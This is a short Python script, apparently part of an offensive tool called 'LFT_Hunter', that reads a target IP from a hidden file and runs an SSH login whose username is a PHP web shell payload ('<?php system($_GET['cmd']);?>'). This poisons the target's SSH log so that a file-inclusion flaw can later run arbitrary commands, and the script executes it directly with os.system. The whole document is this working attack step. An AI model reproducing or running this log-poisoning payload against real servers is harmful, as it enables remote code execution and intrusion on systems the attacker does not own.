#!/usr/bin/env python3
import os
with open (str(os.getcwd())+'/Package/Banner','r') as read:
     print(read.read())
with open('./Package/shell/.address','r') as SSHIP:
         SSHIPH = SSHIP.readlines()         
try:           
    info = ''
    info +='='*20+'\n'
    info +='[+]  _* SSH *_ \n'
    info +='='*30+'\n'
    info +='[!] IP   : .............| : '+ str(SSHIPH[-1])+'\n'
    info +='[+] Port : .............| : 22\n'
    info +='='*40+'\n'
    print(info,end='')
    line = '┌──(SSH-[~/LFT_Hunter]\n'
    line +='└─$ \n'
    print(line)
    line1 ="ssh '<?php system($_GET['cmd']);?>'@"+SSHIPH[-1]
    print(line1)
    command = os.system(line1)
except IndexError: 
   exit()
